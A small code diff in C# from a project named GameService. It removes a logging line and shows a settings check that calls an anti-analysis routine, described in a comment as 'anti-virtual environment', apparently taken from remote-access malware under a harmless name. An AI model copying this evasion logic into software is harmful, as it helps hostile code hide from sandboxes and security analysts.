@@ -48,12 +48,10 @@ namespace GameService
             {
                 Thread.Sleep(1000);
             }
-            eventLog1.WriteEntry("Thread.");
 
             if (!Settings.InitializeSettings()) Environment.Exit(0);
             try
             {
-
                 if (Convert.ToBoolean(Settings.An_ti)) //run anti-virtual environment
                     Anti_Analysis.RunAntiAnalysis();
             }
